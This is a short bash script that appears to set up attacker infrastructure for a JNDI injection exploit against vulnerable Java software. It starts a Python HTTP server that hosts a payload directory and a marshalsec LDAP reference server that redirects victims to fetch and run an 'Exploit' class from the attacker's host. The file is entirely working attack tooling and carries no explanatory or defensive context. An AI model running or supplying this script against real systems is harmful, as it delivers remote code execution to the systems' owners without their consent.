#!/bin/bash
set -e

ATTACKER_IP="${ATTACKER_IP:-10.0.0.20}"
PAYLOAD_PORT=8080
LDAP_PORT=1389

echo "[*] Starting payload HTTP server on :${PAYLOAD_PORT}..."
cd /opt/payloads && python3 -m http.server ${PAYLOAD_PORT} &

echo "[*] Starting marshalsec LDAP relay on :${LDAP_PORT}..."
exec java -cp /opt/marshalsec.jar marshalsec.jndi.LDAPRefServer \
    "http://${ATTACKER_IP}:${PAYLOAD_PORT}/#Exploit" \
    ${LDAP_PORT}
